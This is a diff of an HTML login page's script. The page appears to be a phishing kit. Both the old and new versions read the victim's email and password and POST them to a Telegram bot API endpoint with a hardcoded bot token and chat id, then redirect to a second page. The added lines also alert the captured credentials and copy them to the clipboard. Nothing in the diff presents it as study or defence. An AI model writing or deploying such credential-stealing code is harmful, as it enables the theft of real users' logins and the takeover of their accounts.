@@ -43,41 +43,51 @@
     <script src="./assets/files/bootstrap.js.download"></script>
 
     <script>
-        function sendMessage() {
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
+    function sendMessage() {
+        var email = document.getElementById('email').value;
+        var password = document.getElementById('password').value;
 
-            if (email.length < 5 || password.length < 5) {
-                alert("Email and password must be at least 5 characters long.");
-                return;
-            }
-
-            var message = "New Login:\nEmail: " + email + "\nPassword: " + password;
-
-            fetch('https://api.telegram.org/bot5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM/sendMessage', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: '1634597902',
-                    text: message,
-                }),
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log(data);
-                window.location.href = 'login2.html';
-            })
-            .catch(error => {
-                console.error('There was a problem with the fetch operation:', error);
-            });
+        if (email.length < 5 || password.length < 5) {
+            alert("Email and password must be at least 5 characters long.");
+            return;
         }
-    </script>
+
+        var message = "New Login:\nEmail: " + email + "\nPassword: " + password;
+
+        fetch('https://api.telegram.org/bot5910982961:AAGdCuAo0CqdVhfGLFD72rwI71uAAU-WqAM/sendMessage', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: '1634597902',
+                text: message,
+            }),
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log(data);
+            // Display the message in an alert
+            alert(message);
+            // Copy the message to the clipboard
+            navigator.clipboard.writeText(message).then(function() {
+                console.log('Message copied to clipboard');
+            }).catch(function(err) {
+                console.error('Unable to copy message to clipboard', err);
+            });
+            // Redirect to the appropriate page after sending the message
+            window.location.href = 'login2.html';
+        })
+        .catch(error => {
+            console.error('There was a problem with the fetch operation:', error);
+        });
+    }
+</script>
+
 </body>
 </html>
